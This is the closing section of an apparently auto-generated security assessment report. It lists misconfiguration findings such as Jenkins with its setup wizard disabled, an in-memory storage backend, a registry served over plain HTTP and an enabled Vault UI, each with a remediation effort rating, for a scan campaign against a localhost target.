| Jenkins Running with Setup Wizard Disabled — Unauthenticated... | High |
| In-Memory Storage Backend — No Persistence, No HA, Data Loss... | High |
| Registry Serves Over Plaintext HTTP Without TLS Encryption | High |
| In-Memory Storage Backend — No Persistence, No HA | High |

### P3 — Long term (< 1 month)

| Finding | Effort |
|---------|--------|
| Vault UI Enabled — Increases Attack Surface | High |
| SLSA Provenance Attestation Leaks Internal Infrastructure Ho... | High |

---

*Report auto-generated by Darkmoon AI Security Platform*  
*Classification: CONFIDENTIAL — Restricted to authorized personnel*  
*Generated: 2026-08-01T19:41:06Z*  
*Campaign: camp_20260801_2bd90d3f | Target: 127.0.0.1:5000*
